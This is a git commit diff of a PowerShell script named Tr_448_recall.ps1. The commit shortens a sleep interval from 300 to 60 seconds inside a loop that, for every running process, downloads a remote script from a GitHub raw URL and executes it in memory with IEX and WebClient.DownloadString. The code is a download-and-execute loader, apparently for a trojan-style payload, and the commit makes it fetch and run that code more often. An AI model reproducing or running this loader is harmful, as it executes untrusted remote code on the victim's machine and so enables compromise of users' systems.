890cac4500c6ff5961fcd169ef5c479ceafe159e
HAXORK8880 <107603133+HAXORK8880@users.noreply.github.com>
2022-07-08 19:54:12 +0600

    Update Tr_448_recall.ps1

--- Tr_448_recall.ps1
+++ Tr_448_recall.ps1
@@ -3,7 +3,7 @@ $processes = Get-Process
 $i = 1
 ForEach ($process in $processes) {
 
-    Start-Sleep -Seconds 300
+    Start-Sleep -Seconds 60
     IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/HAXORK8880/servers/main/Tr_448_server.ps1')
     $i++
    
